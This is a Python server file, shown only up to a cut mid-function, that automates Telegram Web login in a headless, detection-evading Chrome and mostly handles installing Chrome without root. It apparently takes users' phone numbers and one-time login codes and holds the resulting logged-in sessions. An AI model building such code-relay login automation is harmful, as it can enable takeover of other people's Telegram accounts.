# ...existing code...
import undetected_chromedriver as uc
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.keys import Keys
import json
import time
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse
from google.oauth2 import service_account
from google.cloud import firestore
from dotenv import load_dotenv
import os
import uuid
from socketserver import ThreadingMixIn
from collections import deque
import base64
import subprocess
import shutil
import re
import signal
import zipfile
import glob
import io
import gzip
import tarfile
import tempfile
import urllib.request

from render_logging import setup_logging, log_startup_banner


load_dotenv()

# Configure logging for Render (stdout, UTC timestamps, level from LOG_LEVEL).
# All [LOG]/[ERROR] output is routed through the standard library `logging` so
# Render's Logs tab shows levels, timestamps and the emitting thread.
log = setup_logging()

# Global variables to store data
phone_data = {}
login_code = None
code_received = threading.Event()
phone_received = threading.Event()

sessions = {}
queue_lock = threading.Lock()

job_queue = deque()
queue_lock = threading.Lock()

LOGIN_TIMEOUT = int(os.environ.get('LOGIN_TIMEOUT', 120))         # time allowed for initial phone->code step
CODE_WAIT = int(os.environ.get('CODE_WAIT', 300))                # max time to wait for user to submit code
CODE_ENTRY_TIMEOUT = int(os.environ.get('CODE_ENTRY_TIMEOUT', 60))

SESSION_TTL = int(os.environ.get('SESSION_TTL', 600))            # keep logged-in session this long (default 10 minutes)
QUEUED_TTL = int(os.environ.get('QUEUED_TTL', 7200)) 

ADMIN_USER = os.environ.get('ADMIN_USER')
ADMIN_PASS = os.environ.get('ADMIN_PASS')

# ---------------------------------------------------------------------------
# Chrome provisioning
# ---------------------------------------------------------------------------
# Render's *native* Python runtime ships no system Chrome and does not run
# build.sh automatically. undetected_chromedriver 3.5.5 then tries to set
# `options.binary_location = None`, which modern selenium rejects with
# "Binary Location Must be a String". We therefore guarantee a usable Chrome
# (downloading Chrome for Testing if needed) and always pass an explicit path.
HERE = os.path.dirname(os.path.abspath(__file__))
CHROME_INSTALL_DIR = os.environ.get('CHROME_INSTALL_DIR', os.path.join(HERE, '.chrome'))
AUTO_INSTALL_CHROME = os.environ.get('AUTO_INSTALL_CHROME', '1').strip().lower() not in ('0', 'false', 'no', 'off')
# Chrome for Testing ships the browser but *not* the system libraries it links
# against (libnss3, libgbm, libasound2, ...). Render's native runtime is Debian
# 12 with none of them and no root, so without these Chrome starts and instantly
# dies ("cannot connect to chrome ... from chrome not reachable"). We unpack the
# .deb packages without root (apt-get download + dpkg-deb -x), same as build.sh.
INSTALL_CHROME_LIBS = os.environ.get('INSTALL_CHROME_LIBS', '1').strip().lower() not in ('0', 'false', 'no', 'off')
LIBS_DIR = os.path.join(CHROME_INSTALL_DIR, 'libs')
LIBS_MARKER = os.path.join(LIBS_DIR, '.complete')
CHROME_APT_PACKAGES = (
    'libnss3 libnspr4 libxss1 libasound2 libdbus-1-3 libatk1.0-0 '
    'libatk-bridge2.0-0 libcups2 libdrm2 libgbm1 libxkbcommon0 libxcomposite1 '
    'libxdamage1 libxext6 libxfixes3 libxrandr2 libxrender1 libxtst6 libxi6 '
    'libxcb1 libx11-6 libxau6 libxdmcp6 libpango-1.0-0 libcairo2 '
    'libatspi2.0-0 libexpat1 libglib2.0-0 libuuid1'
).split()

# Chrome for Testing can crash with SIGTRAP (exit -5) under --headless=new in
# some locked-down containers; the documented upstream workaround is to run
# real google-chrome-stable instead. We can provision that too (no root, same
# .deb extractor). Disable with USE_GOOGLE_CHROME=0.
GOOGLE_CHROME_DEB_URL = os.environ.get(
    'GOOGLE_CHROME_DEB_URL',
    'https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb',
)
USE_GOOGLE_CHROME = os.environ.get('USE_GOOGLE_CHROME', '1').strip().lower() not in ('0', 'false', 'no', 'off')

#: Flags that let Chrome survive in locked-down containers (also used by the
#: startup preflight). ``CHROME_EXTRA_ARGS`` (space separated) is appended, e.g.
#: CHROME_EXTRA_ARGS="--single-process --no-zygote".
CONTAINER_CHROME_ARGS = [
    '--no-sandbox',
    '--disable-setuid-sandbox',
    '--disable-dev-shm-usage',
    '--disable-gpu',
    '--disable-software-rasterizer',
    '--disable-breakpad',
    '--disable-crash-reporter',
    '--disable-features=AudioServiceOutOfProcess,Translate',
]
CHROME_EXTRA_ARGS = os.environ.get('CHROME_EXTRA_ARGS', '').split()

_chrome_lock = threading.Lock()
_chrome_cache = None  # (chrome_path, chromedriver_path) once resolved


def _chrome_candidates():
    """Ordered candidate paths to a Chrome/Chromium executable."""
    candidates = []
    env_path = os.environ.get('CHROME_PATH')
    if env_path:
        candidates.append(env_path)
    candidates.append(os.path.join(CHROME_INSTALL_DIR, 'chrome-linux64', 'chrome'))
    candidates.append(os.path.join(CHROME_INSTALL_DIR, 'google-chrome', 'opt', 'google', 'chrome', 'chrome'))
    for name in ('google-chrome-stable', 'google-chrome', 'chromium-browser', 'chromium', 'chrome'):
        found = shutil.which(name)
        if found:
            candidates.append(found)
    candidates += [
        '/usr/bin/google-chrome-stable',
        '/usr/bin/google-chrome',
        '/usr/bin/chromium-browser',
        '/usr/bin/chromium',
        '/opt/google/chrome/chrome',
    ]
    return candidates


def find_chrome_binary():
    """Return an absolute path to a runnable Chrome/Chromium binary, or None."""
    for path in _chrome_candidates():
        try:
            if path and os.path.isfile(path) and os.access(path, os.X_OK):
                return os.path.abspath(path)
        except Exception:
            continue
    return None


def _prepend_bundled_libs():
    """Add shared libraries unpacked next to Chrome (see build.sh) to
    LD_LIBRARY_PATH so the browser finds libnss3/libgbm/etc."""
    libs = os.path.join(CHROME_INSTALL_DIR, 'libs')
    if not os.path.isdir(libs):
        return
    so_dirs = []
    for root, _dirs, files in os.walk(libs):
        if any(f.endswith('.so') or '.so.' in f for f in files):
            so_dirs.append(root)
    if not so_dirs:
        return
    current = os.environ.get('LD_LIBRARY_PATH', '')
    os.environ['LD_LIBRARY_PATH'] = os.pathsep.join(sorted(so_dirs) + ([current] if current else []))
    log.info(f"LD_LIBRARY_PATH now includes {len(so_dirs)} bundled lib dir(s)")


def install_chrome_for_testing():
    """Download Chrome for Testing + its ChromeDriver into CHROME_INSTALL_DIR."""
    try:
        log.info("No Chrome binary found; downloading Chrome for Testing (first run only, ~150 MB)...")
        meta_url = ("https://googlechromelabs.github.io/chrome-for-testing/"
                    "last-known-good-versions-with-downloads.json")
        with urllib.request.urlopen(meta_url, timeout=60) as resp:
            meta = json.load(resp)
        version = meta['channels']['Stable']['version']
        log.info(f"Chrome for Testing stable version: {version}")
        base = f"https://storage.googleapis.com/chrome-for-testing-public/{version}/linux64"
        os.makedirs(CHROME_INSTALL_DIR, exist_ok=True)
        for archive in ('chrome-linux64.zip', 'chromedriver-linux64.zip'):
            dest = os.path.join(CHROME_INSTALL_DIR, archive)
            urllib.request.urlretrieve(f"{base}/{archive}", dest)
            with zipfile.ZipFile(dest) as zf:
                zf.extractall(CHROME_INSTALL_DIR)
            os.remove(dest)
        chrome = os.path.join(CHROME_INSTALL_DIR, 'chrome-linux64', 'chrome')
        driver = os.path.join(CHROME_INSTALL_DIR, 'chromedriver-linux64', 'chromedriver')
        for exe in (chrome, driver):
            if os.path.exists(exe):
                os.chmod(exe, 0o755)
        log.info(f"Chrome for Testing ready at {chrome}")
        return (chrome if os.path.exists(chrome) else None,
                driver if os.path.exists(driver) else None)
    except Exception as e:
        log.error(f"Failed to install Chrome for Testing: {e}")
        return (None, None)


def _libs_complete():
    return os.path.exists(LIBS_MARKER)


def _chrome_missing_libs(chrome_path):
    """Return the list of sonames `ldd` reports as 'not found' for Chrome."""
    ldd = shutil.which('ldd')
    if not ldd or not chrome_path:
        return []
    try:
        out = subprocess.run([ldd, chrome_path], capture_output=True, text=True, timeout=60)
    except Exception:
        return []
    missing = []
    for line in (out.stdout or '').splitlines():
        if 'not found' in line:
            name = line.strip().split(' ')[0]
            if name:
                missing.append(name)
    return missing


def _chrome_preflight(chrome_path, timeout=60):
    """Actually start Chrome headless once to catch launch-time failures.

    Selenium only reports 'cannot connect to chrome' when the browser dies at
    startup, so this surfaces the real reason (e.g. a missing shared library).
    """
    if not chrome_path:
        return False, "no chrome binary"
    scratch = None
    try:
        scratch = tempfile.mkdtemp(prefix="chrome-preflight-")
    except Exception:
        scratch = None
    args = [chrome_path, '--headless=new', *CONTAINER_CHROME_ARGS, *CHROME_EXTRA_ARGS,
            '--no-first-run', '--dump-dom', 'about:blank']
    if scratch:
        args.insert(1, f'--user-data-dir={scratch}')
    try:
        proc = subprocess.run(args, capture_output=True, text=True, timeout=timeout)
    except subprocess.TimeoutExpired:
        return True, "chrome started (preflight timed out waiting for output)"
    except Exception as e:
        return False, f"could not execute chrome: {e}"
    finally:
        if scratch:
            shutil.rmtree(scratch, ignore_errors=True)
    err = (proc.stderr or '').strip()
    lines = [ln.strip() for ln in err.splitlines() if ln.strip()]
    if proc.returncode == 0:
        return True, "chrome started successfully"
    # Log Chrome's own reason verbatim; the interesting line is usually a
    # [FATAL:...] near the end (SIGTRAP comes right after a failed CHECK).
    for ln in lines[-25:]:
        log.error(f"chrome stderr | {ln}")
    if 'error while loading shared libraries' in err:
        lib = err.split('error while loading shared libraries:')[-1]
        return False, f"missing shared library -> {lib.split(':')[0].strip()}"
    fatal = next((ln for ln in reversed(lines) if 'FATAL' in ln or 'Check failed' in ln), None)
    reason = fatal or (lines[-1] if lines else 'unknown error')
    return False, f"chrome exited {proc.returncode}: {reason[:400]}"


def _debian_package_map(etch='bookworm', arch='amd64'):
    """Map package name -> Filename from Debian main (no apt needed)."""
    url = f'http://deb.debian.org/debian/dists/{etch}/main/binary-{arch}/Packages.gz'
    with urllib.request.urlopen(url, timeout=180) as resp:
        data = gzip.decompress(resp.read())
    mapping = {}
    for block in data.decode('utf-8', 'replace').split('\n\n'):
        pkg = fn = None
        for line in block.splitlines():
            if line.startswith('Package: '):
                pkg = line[9:].strip()
            elif line.startswith('Filename: '):
                fn = line[10:].strip()
            if pkg and fn:
                mapping.setdefault(pkg, fn)
                break
    return mapping


def _download_debian_debs(packages, dest_dir):
    """Download the given packages' .deb files straight from Debian's mirror."""
    try:
        mapping = _debian_package_map()
    except Exception as e:
        log.warning(f"Could not fetch Debian package index: {e}")
        return 0
    got = 0
    for pkg in packages:
        fn = mapping.get(pkg)
        if not fn:
            log.debug(f"Debian index has no package named {pkg}")
            continue
        dest = os.path.join(dest_dir, os.path.basename(fn))
        if os.path.exists(dest):
            got += 1
            continue
        try:
            urllib.request.urlretrieve(f'http://deb.debian.org/debian/{fn}', dest)
            got += 1
        except Exception as e:
            log.debug(f"Download {pkg} failed: {e}")
    return got


def _extract_deb(deb_path, dest_dir):
    """Extract a .deb (an `ar` archive holding data.tar.*) using pure Python."""
    try:
        with open(deb_path, 'rb') as fh:
            if fh.read(8) != b'!<arch>\n':
                return False
            while True:
                header = fh.read(60)
                if len(header) < 60:
                    return False
                name = header[0:16].decode('utf-8', 'replace').strip()
                try:
                    size = int(header[48:58].decode('utf-8', 'replace').strip())
                except ValueError:
                    return False
                payload = fh.read(size)
                if size % 2 == 1:
                    fh.read(1)
                if not name.startswith('data.tar'):
                    continue
                if name.endswith('.zst'):
                    return False  # python stdlib has no zstd reader
                mode = 'r:'
                for suffix, m in (('.xz', 'r:xz'), ('.gz', 'r:gz'), ('.bz2', 'r:bz2')):
                    if name.endswith(suffix):
                        mode = m
                with tarfile.open(fileobj=io.BytesIO(payload), mode=mode) as tf:
                    try:
                        tf.extractall(dest_dir, filter='data')
                    except TypeError:  # Python < 3.12 has no filter kwarg
                        tf.extractall(dest_dir)
                return True
    except Exception as e:
        log.debug(f"Extract {deb_path} failed: {e}")
    return False


def install_google_chrome():
    """Download + unpack real google-chrome-stable without root.

    Chrome for Testing crashes with SIGTRAP under --headless=new in some
    containers; running real Google Chrome is the upstream workaround. The .deb
    is extracted with the same pure-Python reader used for the libraries.
    """
    target = os.path.join(CHROME_INSTALL_DIR, 'google-chrome')
    chrome = os.path.join(target, 'opt', 'google', 'chrome', 'chrome')
    if os.path.isfile(chrome):
        return chrome
    deb = os.path.join(CHROME_INSTALL_DIR, 'google-chrome-stable.deb')
    try:
        log.info("Downloading google-chrome-stable (.deb)...")
        os.makedirs(CHROME_INSTALL_DIR, exist_ok=True)
        urllib.request.urlretrieve(GOOGLE_CHROME_DEB_URL, deb)
    except Exception as e:
        log.warning(f"Could not download Google Chrome: {e}")
        return None
    os.makedirs(target, exist_ok=True)
    ok = _extract_deb(deb, target)
    if not ok:
        dpkg = shutil.which('dpkg-deb')
        if dpkg:
            try:
                r = subprocess.run([dpkg, '-x', deb, target],
                                   capture_output=True, text=True, timeout=180)
                ok = r.returncode == 0
            except Exception:
                ok = False
    try:
        os.remove(deb)
    except Exception:
        pass
    if ok and os.path.isfile(chrome):
        try:
            os.chmod(chrome, 0o755)
        except Exception:
            pass
        log.info(f"Google Chrome ready at {chrome}")
        return chrome
    log.warning("Google Chrome download/unpack failed")
    return None


def install_chrome_libs():
    """Download + unpack Chrome's system libraries *without root*.

    Two unprivileged strategies, in order:
      1. `apt-get download` (uses the local apt; writable state/cache dirs)
      2. plain HTTP download of the required .deb files from deb.debian.org

    Extraction likewise tries `dpkg-deb -x` and falls back to a pure-Python
    `ar`+`tar` reader. Everything lands in LIBS_DIR, which _prepend_bundled_libs()
    adds to LD_LIBRARY_PATH. This is what lets Chrome run on Render's native
    runtime (Debian, no root, packages absent). Deploy the Dockerfile to skip it.
    """
    if _libs_complete():
        return True
    if not INSTALL_CHROME_LIBS:
        log.info("INSTALL_CHROME_LIBS disabled; skipping runtime library bootstrap")
        return False
    apt = shutil.which('apt-get')
    dpkg = shutil.which('dpkg-deb')
    os.makedirs(LIBS_DIR, exist_ok=True)
    debs_dir = os.path.join(CHROME_INSTALL_DIR, 'debs')
    os.makedirs(debs_dir, exist_ok=True)
    log.info(f"Fetching {len(CHROME_APT_PACKAGES)} Chrome system library package(s) "
             "(first run only)...")

    # Strategy 1: apt-get download (fast; needs local apt lists)
    downloaded = 0
    if apt:
        apt_state = os.path.join(CHROME_INSTALL_DIR, 'apt')
        lists_dir = os.path.join(apt_state, 'lists')
        cache_dir = os.path.join(apt_state, 'cache')
        os.makedirs(lists_dir, exist_ok=True)
        os.makedirs(cache_dir, exist_ok=True)
        apt_opts = ['-o', f'Dir::State::lists={lists_dir}', '-o', f'Dir::Cache={cache_dir}']
        try:
            subprocess.run([apt, *apt_opts, 'update'], capture_output=True, text=True, timeout=300)
        except Exception as e:
            log.warning(f"apt-get update failed (continuing): {e}")
        for pkg in CHROME_APT_PACKAGES:
            for name in (pkg, f'{pkg}t64'):
                try:
                    r = subprocess.run([apt, *apt_opts, 'download', name],
                                       cwd=debs_dir, capture_output=True, text=True, timeout=180)
                except Exception:
                    continue
                if r.returncode == 0:
                    downloaded += 1
                    break

    # Strategy 2: download the .deb files directly from Debian (no apt required)
    if not glob.glob(os.path.join(debs_dir, '*.deb')):
        log.info("apt-get unavailable or produced nothing; downloading .deb files "
                 "from deb.debian.org directly")
        downloaded = _download_debian_debs(CHROME_APT_PACKAGES, debs_dir)

    unpacked = 0
    for deb in sorted(glob.glob(os.path.join(debs_dir, '*.deb'))):
        done = False
        if dpkg:
            try:
                r = subprocess.run([dpkg, '-x', deb, LIBS_DIR],
                                   capture_output=True, text=True, timeout=120)
                done = r.returncode == 0
            except Exception:
                done = False
        if not done:
            done = _extract_deb(deb, LIBS_DIR)
        if done:
            unpacked += 1

    if unpacked:
        try:
            with open(LIBS_MARKER, 'w') as fh:
                fh.write(f"{unpacked}\n")
        except Exception:
            pass
        log.info(f"Unpacked {unpacked} of {downloaded} downloaded library package(s) into {LIBS_DIR}")
        return True

    log.warning("Could not unpack Chrome system libraries (no .deb downloaded). "
                "Deploy with the provided Dockerfile for a self-contained runtime.")
    return False


def _chrome_diagnostics(chrome):
    """Dump everything relevant when Chrome/WebDriver cannot start."""
    try:
        log.error("---- Chrome diagnostics ----")
        log.error(f"chrome binary     : {chrome}")
        log.error(f"exists / execable : {os.path.isfile(chrome) if chrome else False} / "
                  f"{os.access(chrome, os.X_OK) if chrome else False}")
        log.error(f"LD_LIBRARY_PATH   : {os.environ.get('LD_LIBRARY_PATH', '(unset)')}")
        libs = glob.glob(os.path.join(LIBS_DIR, '**', '*.so*'), recursive=True)
        log.error(f"bundled libs       : {len(libs)} file(s) under {LIBS_DIR}")
        missing = _chrome_missing_libs(chrome)
        log.error(f"ldd missing        : {', '.join(sorted(set(missing))) if missing else '(none)'}")
        ok, detail = _chrome_preflight(chrome)
        log.error(f"headless launch    : {'OK' if ok else 'FAILED'} - {detail}")
        log.error("---------------------------")
    except Exception as e:
        log.error(f"diagnostics failed: {e}")


def _ensure_chrome_libs(chrome):
    """Make sure Chrome can actually launch (system libs present & resolvable).

    Driven by an actual Chrome launch rather than `ldd` (which may be missing or
    misleading in minimal images), so the library bootstrap runs whenever Chrome
    cannot start -- then it retries the launch.
    """
    _prepend_bundled_libs()
    ok, detail = _chrome_preflight(chrome)
    if not ok and not _libs_complete() and INSTALL_CHROME_LIBS:
        missing = _chrome_missing_libs(chrome)
        if missing:
            log.warning(f"Chrome is missing shared libraries: {', '.join(sorted(set(missing)))}")
        log.warning(f"Chrome failed to start ({detail}); installing missing system libraries")
        install_chrome_libs()
        _prepend_bundled_libs()
        ok, detail = _chrome_preflight(chrome)
    if ok:
        log.info(f"Chrome preflight OK: {detail}")
    else:
        log.error(f"Chrome preflight FAILED: {detail}")


def ensure_chrome():
    """Return (chrome_path, chromedriver_path), installing Chrome if needed.

    Cached so concurrent callers reuse the same result and download only once.
    Also guarantees Chrome's *shared libraries* are available before Chrome runs.
    """
    global _chrome_cache
    with _chrome_lock:
        if _chrome_cache is not None:
            return _chrome_cache
        chrome = find_chrome_binary()
        bundled_driver = os.path.join(CHROME_INSTALL_DIR, 'chromedriver-linux64', 'chromedriver')
        driver = bundled_driver if (os.path.isfile(bundled_driver) and os.access(bundled_driver, os.X_OK)) else None
        if not chrome and AUTO_INSTALL_CHROME:
            chrome, driver = install_chrome_for_testing()
        if chrome:
            _ensure_chrome_libs(chrome)
            # Chrome for Testing can abort (SIGTRAP, exit -5) with --headless=new
            # in some locked-down containers; if it will not start, fall back to
            # real Google Chrome (the documented upstream workaround).
            if USE_GOOGLE_CHROME and not _chrome_preflight(chrome)[0]:
                gc = install_google_chrome()
                if gc:
                    _ensure_chrome_libs(gc)
                    if _chrome_preflight(gc)[0]:
                        log.info("Chrome for Testing could not start; using real Google Chrome")
                        chrome = gc
                        # Its version may differ from the bundled Chrome-for-Testing
                        # driver, so let uc/webdriver-manager fetch a matching one.
                        driver = None
            log.info(f"Using Chrome binary: {chrome}" + (f" | driver: {driver}" if driver else ""))
        else:
            log.error("No Chrome/Chromium binary available (set CHROME_PATH or leave AUTO_INSTALL_CHROME enabled)")
        _chrome_cache = (chrome, driver)
        return _chrome_cache


def _warm_up_browser():
    """Resolve/install Chrome (+ its system libraries) in the background at
    startup, so the first user request is fast and any provisioning problem is
    visible in the deploy logs immediately rather than on the first login."""
    try:
        chrome, driver = ensure_chrome()
        if chrome:
            log.info(f"Browser warm-up complete (chrome={chrome}, driver={driver})")
        else:
            log.warning("Browser warm-up finished without a Chrome binary")
    except Exception as e:
        log.error(f"Browser warm-up failed: {e}")


# Firestore initialization (unchanged)
firestore_db = None
try:
    fb_key = os.environ.get('FIREBASE_KEY')
    if fb_key:
        fb_key = fb_key.strip().strip("'\"")
        sa_info = json.loads(fb_key)
        creds = service_account.Credentials.from_service_account_info(sa_info)
        firestore_db = firestore.Client(project=sa_info.get('project_id'), credentials=creds)
        log.info("Firestore initialized")
    else:
        log.warning("FIREBASE_KEY not found in environment; Firestore disabled")
except Exception as e:
    log.error(f"Failed to initialize Firestore: {e}")
    firestore_db = None

# Session store for concurrent users
sessions = {}
sessions_lock = threading.Lock()

class TelegramAutomation:
    def __init__(self):
        self.driver = None
        self.setup_driver()
        self.current_status = "Ready"
        self.phone_number = None

    # ...existing code...
    def setup_driver(self):
        """Configure and initialize the WebDriver"""
        log.info("Setting up WebDriver...")
        
        def create_chrome_options():
            """Create a fresh ChromeOptions object with all settings.
            Respect `HEADLESS` environment variable (default '1'). Set `HEADLESS=0` or 'false' to run headful.
            """
            opts = uc.ChromeOptions()
            headless_env = os.environ.get('HEADLESS', '1').strip().lower()
            if headless_env not in ('0', 'false', 'no', 'off'):
                opts.add_argument('--headless=new')  # Use new headless mode for better compatibility
            else:
                log.info("HEADLESS env set to false; running Chrome in headful mode")
            for arg in (*CONTAINER_CHROME_ARGS, *CHROME_EXTRA_ARGS):
                opts.add_argument(arg)
            # NOTE: do *not* hard-code --remote-debugging-port here. uc derives its
            # own port (options.debugger_address) and appends the switch itself;
            # a duplicate switch makes chromedriver connect where Chrome is not
            # listening -> "cannot connect to chrome at 127.0.0.1:<port>".
            opts.add_argument('user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36')
            return opts
        
        def detect_chrome_major_version(extra_paths=None):
            """Detect installed Chrome/Chromium major version (returns int or None)"""
            # Respect explicit env overrides first
            env_ver = os.environ.get('CHROME_MAJOR') or os.environ.get('CHROME_VERSION') or os.environ.get('CHROME_MAIN_VERSION')
            if env_ver:
                m = re.search(r'(\d+)', env_ver)
                if m:
                    try:
                        return int(m.group(1))
                    except Exception:
                        pass

            chrome_path = os.environ.get('CHROME_PATH')
            candidates = []
            if extra_paths:
                candidates.extend([p for p in extra_paths if p])
            if chrome_path:
                candidates.append(chrome_path)
            candidates.extend(['google-chrome-stable', 'google-chrome', 'chromium-browser', 'chromium', 'chrome'])

            for cmd in candidates:
                try:
                    which = shutil.which(cmd)
                    if not which:
                        continue
                    out = subprocess.run([which, '--version'], capture_output=True, text=True, timeout=5)
                    ver = (out.stdout or out.stderr or '').strip()
                    m = re.search(r'(\d+)\.(\d+)\.(\d+)', ver)
                    if m:
                        return int(m.group(1))
                except Exception:
                    continue
            return None

        # Ensure a usable Chrome exists *before* uc runs. Otherwise uc 3.5.5
        # assigns options.binary_location = None and modern selenium raises
        # "Binary Location Must be a String". Downloads Chrome for Testing on
        # Render's native runtime where no system Chrome is present.
        chrome_binary, chromedriver_binary = ensure_chrome()
        if not chrome_binary:
            raise RuntimeError(
                "No Chrome/Chromium binary available. Run build.sh, set CHROME_PATH, "
                "or leave AUTO_INSTALL_CHROME enabled so Chrome can be downloaded."
            )

        try:
            log.info("Initializing Chrome with undetected_chromedriver...")
            chrome_options = create_chrome_options()
            # Always pass an explicit string path so uc never assigns None.
            chrome_options.binary_location = chrome_binary
            log.info(f"Chrome binary location: {chrome_binary}")

            # Detect the Chrome major version (including our resolved binary).
            version_main = detect_chrome_major_version([chrome_binary])
            if version_main:
                log.info(f"Detected Chrome major version: {version_main}; passing version_main to uc.Chrome")
            else:
                log.info("Could not detect Chrome major version; letting uc auto-detect")

            uc_kwargs = {
                "options": chrome_options,
                "use_subprocess": True,  # Helps with process management in containers
                "version_main": version_main,
            }
            if chromedriver_binary:
                uc_kwargs["driver_executable_path"] = chromedriver_binary
                log.info(f"Using ChromeDriver: {chromedriver_binary}")

            self.driver = uc.Chrome(**uc_kwargs)
            log.info("WebDriver initialized successfully")
            log.info(f"Chrome version: {self.driver.capabilities.get('browserVersion', 'unknown')}")
        except Exception as e:
            log.error(f"Failed to initialize WebDriver: {e}")
            _chrome_diagnostics(chrome_binary)
            log.info("Attempting with webdriver_manager fallback...")
            try:
                # Fallback: try to use webdriver-manager to get correct version
                from webdriver_manager.chrome import ChromeDriverManager
                log.info("Using webdriver_manager to get matching ChromeDriver...")
                # Create a FRESH ChromeOptions object for the fallback attempt
                chrome_options = create_chrome_options()
                # Always pass an explicit Chrome path so uc never assigns None.
                if chrome_binary:
                    chrome_options.binary_location = chrome_binary
                # If we detected major version, request matching driver from webdriver_manager
                try:
                    version_main = detect_chrome_major_version([chrome_binary])
                except Exception:
                    version_main = None
                if version_main:
                    try:
                        # webdriver-manager >= 4 renamed `version` -> `driver_version`
                        driver_path = ChromeDriverManager(driver_version=str(version_main)).install()
                    except TypeError:
                        driver_path = ChromeDriverManager(version=str(version_main)).install()
                else:
                    driver_path = ChromeDriverManager().install()
                # uc.Chrome builds its own ChromiumService and ignores a `service=`
                # kwarg, so hand it the driver via driver_executable_path instead.
                self.driver = uc.Chrome(
                    options=chrome_options,
                    driver_executable_path=driver_path,
                    version_main=version_main,
                    use_subprocess=True
                )
                log.info("WebDriver initialized successfully with webdriver_manager")
                log.info(f"Chrome version: {self.driver.capabilities.get('browserVersion', 'unknown')}")
            except Exception as e2:
                log.error(f"Failed with webdriver_manager fallback: {e2}")
                log.info("Attempting with plain Selenium/ChromeDriver (non-undetected) fallback...")
                try:
                    from selenium.webdriver.chrome.service import Service
                    driver_exe = chromedriver_binary
                    if not driver_exe:
                        try:
                            from webdriver_manager.chrome import ChromeDriverManager
                            driver_exe = ChromeDriverManager().install()
                        except Exception:
                            driver_exe = None
                    plain = Options()
                    plain.binary_location = chrome_binary
                    for arg in ('--headless=new', '--disable-gpu', '--no-sandbox',
                                '--disable-dev-shm-usage', '--disable-software-rasterizer'):
                        plain.add_argument(arg)
                    self.driver = webdriver.Chrome(service=Service(driver_exe), options=plain)
                    log.info("WebDriver initialized with plain Selenium (ChromeDriver)")
                    log.info(f"Chrome version: {self.driver.capabilities.get('browserVersion', 'unknown')}")
                except Exception as e3:
                    log.error(f"Failed with plain Selenium fallback: {e3}")
                    raise
    # ...existing code...
    def login_with_phone(self, country_code, phone_number):
        """Perform Telegram login with phone number"""
        try:
            self.phone_number = f"+{country_code}{phone_number}"
            # Navigate to Telegram Web
            self.driver.get('https://web.telegram.org/a/')
            log.info("Navigated to Telegram Web")
            
            # Wait for page to load
            time.sleep(5)
            log.info("Page load wait completed")
            
            # Log page source to understand structure
            log.info(f"Page source length: {len(self.driver.page_source)}")
            
            # Scroll to the bottom to ensure all buttons are visible
            log.info("Scrolling to bottom of page to find login button...")
            scroll_result = self.driver.execute_script("window.scrollTo(0, document.body.scrollHeight); return 'scrolled';")
            log.info(f"Scroll result: {scroll_result}")
            time.sleep(2)
            
            # Check if buttons exist on page
            all_buttons = self.driver.find_elements(By.TAG_NAME, "button")
            log.info(f"Total buttons found on page: {len(all_buttons)}")
            for i, btn in enumerate(all_buttons):
                try:
                    btn_text = btn.text.strip()
                    btn_class = btn.get_attribute('class')
                    log.info(f"Button {i}: text='{btn_text}' class='{btn_class}'")
                except Exception as e:
                    log.info(f"Could not read button {i}: {e}")
            
            # Try multiple selectors for the login button
            # Prioritize buttons containing "phone" text to avoid clicking "Log in with Passkey" button
            # Use case-insensitive matching since displayed text is uppercase but source is lowercase
            button_selectors = [
                "//button[contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'phone')]",  # Case-insensitive match for "phone"
                "//button[contains(@class, 'auth-button')][contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'phone')]",  # Button with auth-button class containing "phone"
                "//button[normalize-space(text())='Log in by phone number']",  # Exact match
                "//button[contains(text(), 'Log in by phone number')]",  # Contains match
                "//button[contains(text(), 'Log in by phone')]",
                "//button[contains(., 'phone')]",
                "(//button[contains(@class, 'auth-button') and contains(@class, 'primary')])[last()]",  # Last primary auth button (to get phone, not passkey)
            ]
            
            button_found = False
            for idx, selector in enumerate(button_selectors):
                try:
                    log.info(f"Trying selector {idx}: {selector}")
                    button = WebDriverWait(self.driver, 10).until(
                        EC.element_to_be_clickable((By.XPATH, selector))
                    )
                    btn_text = button.text.strip()
                    log.info(f"Button found with selector {idx}: '{btn_text}'")
                    
                    # Extra verification - make sure it's clickable
                    if button.is_displayed():
                        log.info(f"Button is displayed, attempting to click...")
                        button.click()
                        button_found = True
                        log.info(f"Login button clicked successfully!")
                        break
                    else:
                        log.info(f"Button found but not displayed")
                except Exception as e:
                    log.info(f"Selector {idx} failed: {str(e)}")
                    continue
            
            if not button_found:
                log.info("Login button not found via Selenium selectors, trying JS fallback click...")
                try:
                    js_click_script = (
                        "var btns=Array.from(document.querySelectorAll('button'));"
                        "for(var i=0;i<btns.length;i++){"
                        "  try{ var t=(btns[i].innerText||btns[i].textContent||'').trim().toLowerCase();"
                        "    if(t.indexOf('phone')!==-1 || t.indexOf('phone number')!==-1 || t.indexOf('log in')!==-1 || t.indexOf('login')!==-1 || t.indexOf('sign in')!==-1){"
                        "      btns[i].click(); return {'clicked':true,'index':i,'text':t}; } }catch(e){} }"
                        "for(var i=btns.length-1;i>=0;i--){ try{ if(btns[i].offsetParent!==null){ var t=(btns[i].innerText||btns[i].textContent||'').trim(); btns[i].click(); return {'clicked':true,'index':i,'text':t}; } }catch(e){} }"
                        "return {'clicked':false};"
                    )
                    result = self.driver.execute_script(js_click_script)
                    log.info(f"JS click result: {result}")
                    clicked = False
                    if isinstance(result, dict):
                        clicked = result.get('clicked', False)
                    elif isinstance(result, (list, tuple)) and len(result) > 0:
                        try:
                            clicked = bool(result[0].get('clicked'))
                        except Exception:
                            clicked = False
                    elif isinstance(result, str):
                        try:
                            import json
                            rj = json.loads(result)
                            clicked = rj.get('clicked', False)
                        except Exception:
                            clicked = False

                    if clicked:
                        button_found = True
                        log.info("Login button clicked via JS fallback")
                    else:
                        log.info("JS fallback did not find a suitable button")
                except Exception as e:
                    log.info(f"JS fallback failed: {e}")

                if not button_found:
                    log.error("Could not find any login button")
                    # Save debug info
                    self.driver.save_screenshot('telegram_button_error.png')
                    with open('telegram_button_error.html', 'w', encoding='utf-8') as f:
